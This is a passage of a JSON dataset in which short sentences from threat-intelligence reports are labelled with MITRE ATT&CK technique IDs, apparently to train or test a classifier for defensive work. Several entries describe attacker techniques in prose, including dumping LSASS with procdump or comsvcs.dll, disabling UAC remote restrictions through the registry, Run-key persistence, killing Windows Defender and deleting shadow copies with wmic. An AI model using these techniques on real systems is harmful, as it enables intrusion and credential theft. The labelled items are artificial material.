    "text": "can enumerate the OS version and domain on a targeted system.(Citation: Google EXOTIC LILY March 2022)(Citation: Proofpoint Bumblebee April 2022)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTPS for C2.(Citation: Talos Cobalt Group July 2018)(Citation: PTSecurity Cobalt Dec 2016)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "configured its payload to inject into the rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "extracted files from compromised networks. ",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "direct Cobalt Strike processes and the injected processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "To obtain authentication data, the attackers may dump the LSASS process using legitimate tools (procdump, comsvcs.dll).",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "details of the RDP session",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "malware installs itself as a service to provide persistence and SYSTEM privileges.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "surveys a system upon check-in to discover running processes using the tasklist /v command.(Citation: Kaspersky Turla)  RPC backdoors have also enumerated processes associated with specific open ports or named pipes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "2 Downloads a file to the system",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "establish another RDP session to a different internal server",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "hardware information.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "obtains the device’s local and external IP address.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "the ‘mimikatz’ string in the Netlogon event that is used by the Mimikatz Zerologon implementation.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has enumerated hosts looking for the public IP address of the system.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can inject malicious code into process created by the Command_Create&Inject function.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can specify the local file path to upload files from.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has been known to stage files for exfiltration in a single location.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "can upload files to its C2.(Citation: ClearSky Siamesekitten August 2021)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "can inject itself into processes including explore.exe Iexplore.exe and Mobsync.exe.(Citation: Trend Micro Qakbot May 2020)(Citation: Kroll Qakbot June 2020)(Citation: Trend Micro Qakbot December 2020)",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "contains the readFiles function to return a detailed listing (sometimes recursive) of a specified directory.  contains the showBackupIosFolder function to check for IOS device backups by running ls -la ~/Library/Application\\ Support/MobileSync/Backup/.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "PowerShell Empire’s ReflectivePEInjection script",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "MiniDump, “a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps”",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "can detect system information--including disk names total space and remaining space--to create a hardware profile GUID which acts as a system identifier for operators.(Citation: Eset Ramsay May 2020)",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "collected the registry value HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography\\MachineGuid from compromised hosts.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to create a reverse shell on the infected endpoint.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can collect the computer name system architecture default language and processor frequency of a compromised host.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "DbgBreakPoint and DbgUiRemoteBreakin API",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "injects it into the created process",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe /c to execute files. ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has called GetCurrentProcess.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "command uses the Windows Management Instrumentation Command-line (WMIC)",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "Obtains the IP address from the ClientIpAddress field",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "GetSubDirectoryFileListRecursive function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download VBS files to the target computer.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "backdoor is a basic remote shell",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "executes cmd.exe to provide a reverse shell to adversaries.(Citation: FireEye FIN7 March 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "first stage has been executed by a call to CreateProcess with the decryption password in an argument.  has used a call to LoadLibrary to load its installer.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "created new Windows services and added them to the startup directories for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the id of a logged in user.",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "is capable of listing contents of folders on the victim.  also searches for custom network encryption software on victims.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Full Report)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has written process names to the Registry disabled IE browser features deleted Registry keys and changed the ExtendedUIHoverTime key.(Citation: Medium Metamorfo Apr 2020)(Citation: Fortinet Metamorfo Feb 2020)(Citation: FireEye Metamorfo Apr 2018)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has used malicious .exe or .dll files disguised as documents or images.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "HTTP C2 Communication",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "The SHAPESHIFT malware is capable of wiping disks, erasing volumes and deleting files, depending on its configuration",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "can obtain the OS version information computer name processor architecture machine role and OS edition.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Once establishing the RDP connection, they deployed Powertool64.exe,",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can launch cmd.exe to perform reconnaissance commands.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Retrieve the user domain name, username",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "used a batch script to run the Linux virtual machine as a service.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "communicated with its C2 server via HTTP GET requests.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "used several tools for retrieving login and password information including LaZagne and Mimikatz.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "uses registry run keys for persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "this snippet of code invokes ptrace with PT_DENY_ATTACH (0x1f) which will kill the process if a debugger is currently attached,",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "The threat used valid accounts against remote services:",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "can list active processes running on the victims machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has collected stolen files in a temporary folder in preparation for exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "Deletes the WinDefend service",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "perform process injection to masquerade as harmless processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "WMI Persistence",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to lure victims into opening malicious email attachments.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "gathers file and directory information from the victims machine.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can execute shell commands.(Citation: Trend Micro Daserf Nov 2017)",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Once the victim opens the document,",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "Command Line Execution",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "samples have used HTTP over ports 447 and 8082 for C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can be configured to create a service for persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "can extract drive information from the endpoint and search files on the system.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has used cmd.exe to execute commmands.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "s C2 proxy tool sends data to a C2 server over HTTP.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "established persistence via a run key.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "which initiates the payload download",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Reflective PE injection is a technique used by malware or advanced attackers to inject a Portable Executable (PE) file directly into the memory of a running process without the need for writing the file to disk",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can disable Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "uses cmd.exe to execute commands on the system.(Citation: ESET Zebrocy May 2019) ",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "enumerates all running processes",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "creates new services to establish persistence.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010)",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to download additional payloads from C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has created a scheduled task for persistence.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "sets a WH_CBT Windows hook to collect information on process creation.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to overwrite its own file with random bites.(Citation: Crowdstrike DriveSlayer February 2022)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has a command to download an .exe and execute it via CreateProcess API. It can also run with ShellExecute.(Citation: Forcepoint Monsoon)",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "can use the `LoadResource` and `CreateProcessW` APIs for execution.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has been installed as a Windows service.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "has used a script to gather credentials in files left on disk by OpenSSH backdoors.",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "This function scans VM volumes on an ESXi server.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can obtain a list of running processes on the system.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "use a set of tools via remote desktop",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "uses rundll32 within  entries to execute malicious DLLs.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "uses HTTP and HTTPS for command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "can spawn remote shells.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to use HTTP to send information collected from an infected host to C2.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Batch script to run",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "the adversary gained credentials in the network",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has downloaded additional malware onto compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Disables the startup of the WinDefend service",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "can delete its loader using a batch file in the Windows temporary folder.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "has used  to evade security software while deploying tools on compromised systems.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "This suggests that other WMI-based VM detection techniques may also detect certain physical systems if those systems do not support the specific WMI query",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can use services to establish persistence.",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "SetRegistryValue",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "It provides\napplications with API functions—available",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "other compromised host running the parent HTTP Beacon",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "Explanation of schtask parameters",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "can download and execute an executable from the C2 server.(Citation: Talos Micropsia June 2017)",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can download files to a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32 to execute a malicious DLL.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "A variant of  executes dir C:\\progra~1 when initially run.(Citation: Lotus Blossom Jun 2015)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "or command line interface tools",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "This method is responsible for collecting system information",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate files on a compromised host.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "the import address table and relocation table of the newly injected PE.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has used scheduled tasks to execute malicious PowerShell code on remote systems.",
    "command": "",
    "labels": [
      "T1053.005"
    ]
  },
  {
    "type": "text",
    "text": "operators use Mimikatz to dump passwords from LSASS.",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has used HTTP for command and control.",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "During  stolen data was copied into a text file using the format `From <COMPUTER-NAME> (<Month>-<Day> <Hour>-<Minute>-<Second>).txt` prior to compression encoding and exfiltration.",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has been used to load  onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The process injection technique was used multiple times to inject into different processes",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to list files upon receiving the ls command from C2.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "backdoor can query the Windows Registry to gather system information. ",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "has created the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU to maintain persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can gather the username from an infected host.(Citation: Mandiant UNC3313 Feb 2022) ",
    "command": "",
    "labels": [
      "T1033"
    ]
  },
  {
    "type": "text",
    "text": "can retrieve the contents of the IP routing table as well as information about the Windows domain.(Citation: Github Koadic)",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can set the AutoRun Registry key with a PowerShell command.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has searched compromised systems for folders of interest including those related to HR audit and expense and meeting memos.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "sets HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load to point to its executable.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has discovered the OS version CPU model and RAM size of the system it has been installed on.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can migrate into another process using reflective DLL injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "is capable of uploading and downloading files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HD Creates a file in the Temp path and names it “hd” + PCID then invokes another program module named hd.test1 to identify logical drives",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to search for a given filename on a victim.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "is a known indicator of such tools as Mimikatz",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to deploy a reconnaissance module to retrieve a list of the active processes.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "often will search for directories on the network",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to drop and execute additional components.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "uses API calls to enumerate the infected system's ARP table.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "can obtain information about the OS processor and BIOS.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "can check if a specific process is running such as Kaspersky's `avp.exe`.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "A threat actor could establish an administrator session",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to terminate/stop processes and services associated with endpoint security products.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "Calls CryptEncrypt",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "usage of Mimikatz",
    "command": "",
    "labels": [
      "T1003.001"
    ]
  },
  {
    "type": "text",
    "text": "Once  has access to a network share it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "This system configuration file (in.sys) will drop a backdoor installer (UserInstall.exe) then delete itself",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "creates a Registry start-up entry to establish persistence.(Citation: McAfee Netwire Mar 2015)(Citation: Red Canary NETWIRE January 2020)(Citation: Unit 42 NETWIRE April 2020)",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate the victim's desktop.(Citation: Cybereason Bazar July 2020)",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "checks processes on the system and if they meet the necessary requirements it injects into that process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can use `wmic.exe` as part of its effort to delete shadow copies.",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "can execute remote commands in the Windows command shell using the WinExec() API.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "recursively searches through directories for files.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "can delete files indicated by the attacker and remove itself from disk using a batch file.",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "The  executable has been retrieved via embedded macros in malicious Word documents.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "domain name, Hostname and OS Version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "DEL-TEMP Deletes all files in the “AppData/Local/Temp” path",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "uses the Microsoft  utility to list processes running on systems.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can collect the IP address from the victims machine.",
    "command": "",
    "labels": [
      "T1016"
    ]
  },
  {
    "type": "text",
    "text": "injects its DLL file into a newly spawned Internet Explorer process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "the malware initiates a download, which delivers an executable",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "may collect process information by running tasklist on a victim.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "performed through the CryptUnprotectData API function",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "has also used 's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "During  a first-stage downloader installed  to `%Startup%\\mssync.exe` on a compromised host. ",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "has injected malicious code into a new svchost.exe process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "as attempted to lure victims into clicking on malicious attachments within spearphishing emails.(Citation: Securelist Octopus Oct 2018)",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "gets an output of running processes using the tasklist command.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "ease of batch file execution.",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel.",
    "command": "",
    "labels": [
      "T1021.001"
    ]
  },
  {
    "type": "text",
    "text": "can identify installed security tools based on process names.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "the process into which the shellcode will be injected",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "has the capability to to delete files.(Citation: FireEye Hacking Team)",
    "command": "",
    "labels": [
      "T1070.004"
    ]
  },
  {
    "type": "text",
    "text": "Retrieves system default language, timezone and OS version",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "has executed custom-compiled XMRIG miner DLLs using rundll32.exe.",
    "command": "",
    "labels": [
      "T1218.011"
    ]
  },
  {
    "type": "text",
    "text": "has the ability to upload and download files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "includes subprojects that enumerate and identify information about  candidates.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "can collect host data and specific file types.(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021)",
    "command": "",
    "labels": [
      "T1005"
    ]
  },
  {
    "type": "text",
    "text": "created and established a service that runs until the encryption process is complete. ",
    "command": "",
    "labels": [
      "T1543.003"
    ]
  },
  {
    "type": "text",
    "text": "Injecting pc.dll into LSASS as a Security Package",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "can enumerate all processes on the victim's machine.",
    "command": "",
    "labels": [
      "T1057"
    ]
  },
  {
    "type": "text",
    "text": "maintains a configuration block and virtual file system in the Registry.(Citation: Kaspersky ShadowPad Aug 2017)",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has attempted to get victims to launch malicious Microsoft Word attachments delivered via spearphishing emails.",
    "command": "",
    "labels": [
      "T1204.002"
    ]
  },
  {
    "type": "text",
    "text": "has used a script that checks `/proc/*/environ` for environment variables related to AWS.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "collects the OS version hardware information computer name available system memory status disk space information and system and user language settings.",
    "command": "",
    "labels": [
      "T1082"
    ]
  },
  {
    "type": "text",
    "text": "it searches for .blf files in the\ndefault user’s profile directory",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "The threat actor accomplished this by using administrative accounts",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "kills and disables services for Windows Security Center and Windows Defender.",
    "command": "",
    "labels": [
      "T1562.001"
    ]
  },
  {
    "type": "text",
    "text": "the execution of the batch file",
    "command": "",
    "labels": [
      "T1059.003"
    ]
  },
  {
    "type": "text",
    "text": "Register the RUN key in the registry below, so that the VBS file is executed every time the machine starts",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "modifies the victim's system power and lid open/close policies in the registry.",
    "command": "",
    "labels": [
      "T1112"
    ]
  },
  {
    "type": "text",
    "text": "has stored collected information in the Application Data directory on a compromised host.(Citation: Securelist Octopus Oct 2018)",
    "command": "",
    "labels": [
      "T1074.001"
    ]
  },
  {
    "type": "text",
    "text": "has used the NtQueryDirectoryFile and ZwQueryDirectoryFile functions to hide files and directories.",
    "command": "",
    "labels": [
      "T1106"
    ]
  },
  {
    "type": "text",
    "text": "is capable of downloading remote files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "malware including RoyalCli and BS2005 have communicated over HTTP with the C2 server through Internet Explorer (IE) by using the COM interface IWebBrowser2.(Citation: NCC Group APT15 Alive and Strong)",
    "command": "",
    "labels": [
      "T1071.001"
    ]
  },
  {
    "type": "text",
    "text": "(crawl whole tree), I:, H:, G:, F:, E:, and D:.",
    "command": "",
    "labels": [
      "T1083"
    ]
  },
  {
    "type": "text",
    "text": "creates an autostart Registry key to ensure persistence.",
    "command": "",
    "labels": [
      "T1547.001"
    ]
  },
  {
    "type": "text",
    "text": "injects itself into the secure shell (SSH) process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "attacker use of WMI",
    "command": "",
    "labels": [
      "T1047"
    ]
  },
  {
    "type": "text",
    "text": "has used WMIC to execute remote commands.(Citation: Cycraft Chimera April 2020)",
    "command": "",
